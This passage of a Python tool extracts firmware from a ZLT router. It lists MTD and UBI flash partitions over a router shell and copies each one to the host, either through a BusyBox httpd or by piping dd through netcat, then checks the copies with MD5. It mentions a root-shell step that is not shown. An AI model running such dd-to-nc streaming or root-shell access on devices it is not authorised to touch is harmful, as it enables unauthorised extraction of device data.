            dev, sz_hex, er_hex, label = m.groups()
            safe = re.sub(r"[^A-Za-z0-9_.-]", "_", label)
            self.partitions.append({
                "index":      len(self.partitions) + 1,
                "type":       "MTD",
                "dev":        f"/dev/{dev}",
                "id":         dev,
                "name":       label,
                "size_bytes": int(sz_hex, 16),
                "erasesize":  int(er_hex, 16),
                "filename":   f"{dev}_{safe}.bin",
            })
            logger.debug("Partition: /dev/%s  %s  %d bytes", dev, label, int(sz_hex, 16))

        for line in ubi_raw.splitlines():
            parts = line.strip().split("|")
            if len(parts) == 4 and parts[0].startswith("ubi"):
                ubi_dev, _, data_str, vol_name = parts
                try:
                    sz = int(data_str)
                except ValueError:
                    sz = 0
                if sz > 0:
                    safe = re.sub(r"[^A-Za-z0-9_.-]", "_", vol_name)
                    self.partitions.append({
                        "index":      len(self.partitions) + 1,
                        "type":       "UBI",
                        "dev":        f"/dev/{ubi_dev}",
                        "id":         ubi_dev,
                        "name":       vol_name,
                        "size_bytes": sz,
                        "erasesize":  0,
                        "filename":   f"{ubi_dev}_{safe}.bin",
                    })
                    logger.debug("UBI vol: /dev/%s  %s  %d bytes", ubi_dev, vol_name, sz)

        if not self.partitions:
            logger.error("No partitions parsed — raw /proc/mtd:\n%s", mtd_raw)
            console.print("[red]✘  No partitions found in /proc/mtd output.[/red]")
            sys.exit(1)

        logger.info("Total partitions discovered: %d", len(self.partitions))

        tmp_safe = int(tmp_free_kb * 1024 * 0.80)
        tbl = Table(
            title=f"Discovered Partitions  (free /tmp: {format_bytes(tmp_free_kb * 1024)})",
            box=box.ROUNDED, header_style="bold cyan",
        )
        tbl.add_column("#",       justify="right", style="bold")
        tbl.add_column("Type",    style="magenta")
        tbl.add_column("Device",  style="green")
        tbl.add_column("Name",    style="bold white")
        tbl.add_column("Size",    justify="right", style="yellow")
        tbl.add_column("Mode",    style="cyan")

        for p in self.partitions:
            mode = (
                "[green]HTTP → /tmp[/green]"
                if p["size_bytes"] <= tmp_safe
                else "[bold yellow]Zero-RAM TCP[/bold yellow]"
            )
            tbl.add_row(str(p["index"]), p["type"], p["dev"],
                        p["name"], format_bytes(p["size_bytes"]), mode)
        console.print(tbl)
        console.print()

    def _get_tmp_free_kb(self) -> int:
        assert self.shell is not None
        out  = self.shell.exec_cmd("df -k /tmp | tail -n 1")
        nums = re.findall(r"\b(\d+)\b", out)
        return int(nums[2]) if len(nums) >= 3 else 128 * 1024

    # --------------------------------------------------------------------------
    # STEP 5 — EXTRACTION
    # --------------------------------------------------------------------------

    def step_5_dump_partitions(self) -> None:
        console.print(Rule("[bold bright_blue]Step 5 of 5  ·  RAM-Safe Extraction & MD5 Verification[/bold bright_blue]"))
        assert self.shell is not None

        sel = Prompt.ask(
            "[bold][A][/bold]ll  [bold][M][/bold]TD only  or comma-separated numbers",
            default="A",
        ).strip()

        if sel.upper() == "A":
            selected = self.partitions
        elif sel.upper() == "M":
            selected = [p for p in self.partitions if p["type"] == "MTD"]
        else:
            ids = {int(x) for x in sel.split(",") if x.strip().isdigit()}
            selected = [p for p in self.partitions if p["index"] in ids]

        if not selected:
            console.print("[yellow]No partitions selected — exiting.[/yellow]")
            return

        ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = Path.home() / "Downloads" / f"ZLT_Dump_{ts}"
        out_dir.mkdir(parents=True, exist_ok=True)
        self.out_dir = out_dir

        # Wire the logger to a file NOW that we have out_dir
        log_path = _setup_logging(out_dir)
        logger.info("=" * 60)
        logger.info("ZLT Dumper session started")
        logger.info("Router: %s://%s  firmware=%s  mac_ip=%s",
                    self.proto, self.router_ip, self.firmware_type, self.mac_ip)
        logger.info("Output directory: %s", out_dir)
        logger.info("=" * 60)

        console.print(f"  [green]✔[/green] Output     → [bold cyan]{out_dir}[/bold cyan]")
        console.print(f"  [green]✔[/green] Session log → [bold cyan]{log_path}[/bold cyan]\n")

        self._start_router_httpd()

        results: List[Dict] = []
        for idx, part in enumerate(selected, 1):
            console.print(
                f"[bold]({idx}/{len(selected)}) {part['dev']}  "
                f"[cyan]{part['name']}[/cyan]  {format_bytes(part['size_bytes'])}[/bold]"
            )
            logger.info("--- Dumping %s (%s, %s) ---",
                        part["dev"], part["name"], format_bytes(part["size_bytes"]))

            self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
            free_kb    = self._get_tmp_free_kb()
            safe_bytes = int(free_kb * 1024 * 0.80)
            local_path = out_dir / part["filename"]

            success = False; local_md5 = ""; remote_md5 = ""; err_msg = ""

            for attempt in range(1, 3):
                if attempt > 1:
                    logger.info("Retry %d/2 for %s", attempt, part["dev"])
                    console.print(f"  [yellow]↻ Attempt {attempt}/2[/yellow]")
                try:
                    if self.httpd_active and part["size_bytes"] <= safe_bytes:
                        logger.info("Transfer mode: HTTP /tmp staging")
                        success, local_md5, remote_md5 = self._dump_via_http(part, local_path)
                    else:
                        logger.info("Transfer mode: Zero-RAM TCP stream")
                        success, local_md5, remote_md5 = self._dump_via_tcp_stream(part, local_path)
                    if success:
                        break
                except Exception as exc:
                    err_msg = str(exc)
                    logger.error("Dump attempt %d failed: %s\n%s",
                                 attempt, exc, traceback.format_exc())
                    self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")

            if success:
                logger.info("✔ %s  local_md5=%s  remote_md5=%s  size=%d",
                            part["filename"], local_md5, remote_md5,
                            local_path.stat().st_size)
                console.print(
                    f"  [green]✔ Verified[/green]  {part['filename']}  "
                    f"MD5: [green]{local_md5}[/green]"
                )
                results.append({**part, "status": "OK", "md5": local_md5})
            else:
                logger.error("✘ %s  FAILED: %s", part["dev"], err_msg or "unknown")
                console.print(f"  [red]✘ Failed[/red]  {err_msg or 'checksum mismatch'}")
                results.append({**part, "status": "FAILED", "md5": "-"})

        self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
        self._write_manifest_and_summary(out_dir, results)

    # ── router-side BusyBox httpd ──────────────────────────────────────────────

    def _start_router_httpd(self) -> None:
        assert self.shell is not None
        logger.info("Starting BusyBox httpd on router /tmp port %d", self.http_port)
        with console.status("[cyan]Starting BusyBox httpd on router...[/cyan]"):
            self.shell.exec_cmd(
                f"busybox httpd -p {self.http_port} -h /tmp || httpd -p {self.http_port} -h /tmp"
            )
            self.shell.exec_cmd("echo HTTPD_OK > /tmp/zlt_probe.txt")
            try:
                url = f"http://{self.router_ip}:{self.http_port}/zlt_probe.txt"
                with urllib.request.urlopen(url, timeout=3.0) as r:
                    self.httpd_active = b"HTTPD_OK" in r.read()
            except Exception as exc:
                logger.debug("httpd probe failed: %s", exc)
                self.httpd_active = False
            finally:
                self.shell.exec_cmd("rm -f /tmp/zlt_probe.txt")

        if self.httpd_active:
            logger.info("Router httpd active on :%d", self.http_port)
            console.print(f"  [green]✔[/green] Router httpd active on :{self.http_port}")
        else:
            logger.info("Router httpd unavailable — using TCP stream for all partitions")
            console.print("  [yellow]ℹ[/yellow] httpd unavailable — Zero-RAM TCP for all partitions.")

    # ── HTTP /tmp staging mode ────────────────────────────────────────────────

    def _dump_via_http(self, part: Dict, local_path: Path) -> Tuple[bool, str, str]:
        assert self.shell is not None
        tmp_name   = f"zlt_dump_{part['id']}.bin"
        tmp_path   = f"/tmp/{tmp_name}"
        dd_timeout = max(30.0, part["size_bytes"] / (1024 * 1024) * 2.5 + 20.0)

        logger.debug("dd %s → %s  timeout=%.0fs", part["dev"], tmp_path, dd_timeout)
        with console.status(f"[cyan]dd {part['dev']} → {tmp_path}...[/cyan]", spinner="dots"):
            dd_out = self.shell.exec_cmd(
                f"dd if={part['dev']} of={tmp_path} bs=4096 2>&1", timeout=dd_timeout
            )
            logger.debug("dd output: %s", dd_out)
            md5_out = self.shell.exec_cmd(f"md5sum {tmp_path}", timeout=30.0)
            logger.debug("remote md5sum: %s", md5_out)
            m          = re.search(r"\b([0-9a-fA-F]{32})\b", md5_out)
            remote_md5 = m.group(1).lower() if m else ""

        url    = f"http://{self.router_ip}:{self.http_port}/{tmp_name}"
        hasher = hashlib.md5()
        logger.debug("Downloading %s", url)

        try:
            with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                          BarColumn(bar_width=32), DownloadColumn(),
                          TransferSpeedColumn(), TimeRemainingColumn(),
                          console=console, transient=True) as prog:
                task = prog.add_task(f"[cyan]↓ {part['filename']}", total=part["size_bytes"])
                with urllib.request.urlopen(url, timeout=30.0) as resp, \
                     open(local_path, "wb") as f:
                    while True:
                        chunk = resp.read(65536)
                        if not chunk:
                            break
                        f.write(chunk); hasher.update(chunk)
                        prog.update(task, advance=len(chunk))
        finally:
            self.shell.exec_cmd(f"rm -f {tmp_path}")

        local_md5 = hasher.hexdigest().lower()
        logger.debug("local md5=%s  remote md5=%s", local_md5, remote_md5)

        if remote_md5 and local_md5 != remote_md5:
            raise ValueError(f"MD5 mismatch (router:{remote_md5} vs mac:{local_md5})")
        if local_path.stat().st_size == 0:
            raise ValueError("Downloaded file is 0 bytes")
        return True, local_md5, remote_md5

    # ── Zero-RAM direct TCP stream ────────────────────────────────────────────

    def _dump_via_tcp_stream(self, part: Dict, local_path: Path) -> Tuple[bool, str, str]:
        assert self.shell is not None

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        listen_port = srv.getsockname()[1]
        srv.listen(1)
        srv.settimeout(12.0)
        logger.debug("TCP listener on Mac :%d for %s", listen_port, part["dev"])

        hasher    = hashlib.md5()
        err_list: List[str] = []

        def _recv():
            try:
                conn, addr = srv.accept()
                logger.debug("TCP stream connection from %s", addr)
                conn.settimeout(30.0)
                with Progress(SpinnerColumn(), TextColumn("{task.description}"),
                              BarColumn(bar_width=32), DownloadColumn(),
                              TransferSpeedColumn(), TimeRemainingColumn(),
                              console=console, transient=True) as prog:
                    task = prog.add_task(
                        f"[yellow]⇄ {part['filename']} (Zero-RAM)", total=part["size_bytes"]
                    )
                    with open(local_path, "wb") as f:
                        while True:
                            data = conn.recv(65536)
                            if not data:
                                break
                            f.write(data); hasher.update(data)
                            prog.update(task, advance=len(data))
                conn.close()
            except Exception as exc:
                logger.error("TCP receiver error: %s\n%s", exc, traceback.format_exc())
                err_list.append(str(exc))
            finally:
                srv.close()

        t = threading.Thread(target=_recv, daemon=True)
        t.start()

        stream_timeout = max(45.0, part["size_bytes"] / (1024 * 1024) * 3.5 + 30.0)
        cmd = (
            f"dd if={part['dev']} bs=4096 2>/dev/null | nc {self.mac_ip} {listen_port} || "
            f"dd if={part['dev']} bs=4096 2>/dev/null | busybox nc {self.mac_ip} {listen_port}"
        )
        logger.debug("Stream cmd: %s  timeout=%.0fs", cmd, stream_timeout)
        self.shell.exec_cmd(cmd, timeout=stream_timeout)
        t.join(timeout=15.0)

        if err_list:
            raise ConnectionError(
                f"TCP stream error: {err_list[0]}  "
                "(check System Settings → Privacy & Security → Firewall)"
            )

        with console.status(f"[cyan]Verifying MD5 on router for {part['dev']}...[/cyan]"):
            md5_out    = self.shell.exec_cmd(f"md5sum {part['dev']}", timeout=stream_timeout)
            logger.debug("remote md5sum: %s", md5_out)
            m          = re.search(r"\b([0-9a-fA-F]{32})\b", md5_out)
            remote_md5 = m.group(1).lower() if m else ""

        local_md5 = hasher.hexdigest().lower()
        logger.debug("local md5=%s  remote md5=%s", local_md5, remote_md5)

        if remote_md5 and local_md5 != remote_md5:
            raise ValueError(f"MD5 mismatch (router:{remote_md5} vs mac:{local_md5})")
        if not local_path.exists() or local_path.stat().st_size == 0:
            raise ValueError("Streamed file is empty")
        return True, local_md5, remote_md5

    # ── Manifest + summary ────────────────────────────────────────────────────

    def _write_manifest_and_summary(self, out_dir: Path, results: List[Dict]) -> None:
        with open(out_dir / "dump_manifest.json", "w", encoding="utf-8") as f:
            json.dump({
                "router_ip":     self.router_ip,
                "firmware_type": self.firmware_type,
                "timestamp":     datetime.now().isoformat(),
                "partitions":    results,
            }, f, indent=2)

        with open(out_dir / "checksums.md5", "w", encoding="utf-8") as f:
            for r in results:
                if r["status"] == "OK":
                    f.write(f"{r['md5']}  {r['filename']}\n")

        logger.info("Manifest and checksums written to %s", out_dir)

        ok_count   = sum(1 for r in results if r["status"] == "OK")
        fail_count = len(results) - ok_count
        logger.info("Extraction complete: %d OK  %d FAILED", ok_count, fail_count)

        tbl = Table(title="Extraction Summary", box=box.ROUNDED, header_style="bold green")
        tbl.add_column("Device",  style="cyan")
        tbl.add_column("File",    style="bold white")
        tbl.add_column("Size",    justify="right", style="yellow")
        tbl.add_column("MD5",     style="dim")
        tbl.add_column("Result",  justify="center")

        for r in results:
            badge = (
                "[bold green]✔ OK[/bold green]"
                if r["status"] == "OK"
                else "[bold red]✘ FAIL[/bold red]"
            )
            tbl.add_row(r["dev"], r["filename"], format_bytes(r["size_bytes"]), r["md5"], badge)

        console.print()
        console.print(tbl)
        console.print(
            Panel(
                f"Saved to: [bold cyan]{out_dir}[/bold cyan]\n\n"
                f"  • [dim].bin images[/dim]\n"
                f"  • [dim]checksums.md5[/dim]\n"
                f"  • [dim]dump_manifest.json[/dim]\n"
                f"  • [bold yellow]session.log[/bold yellow]  ← full audit trail of every request and command",
                title="[bold green]Dump Complete[/bold green]",
                border_style="green",
            )
        )

    # --------------------------------------------------------------------------
    # ENTRY POINT
    # --------------------------------------------------------------------------

    def run(self) -> None:
        try:
            self.print_banner()
            self.step_1_network_discovery()
            self.step_2_login_and_get_session()
            self.step_3_activate_root_shell()
            self.step_4_discover_partitions()
            self.step_5_dump_partitions()
        except KeyboardInterrupt:
            console.print("\n[yellow]⚠  Interrupted — cleaning up router /tmp...[/yellow]")
            logger.warning("Session interrupted by user (KeyboardInterrupt)")
            if self.shell:
                try:
                    self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
                except Exception:
                    pass
        except Exception as exc:
            logger.critical("Unhandled exception: %s\n%s", exc, traceback.format_exc())
            console.print(f"\n[bold red]Unexpected error:[/bold red] {exc}")
            console.print("[dim]Full traceback written to session.log[/dim]")
        finally:
            if self.shell:
                self.shell.close()
            logger.info("Session ended")


if __name__ == "__main__":
    ZLTFirmwareDumperCLI().run()
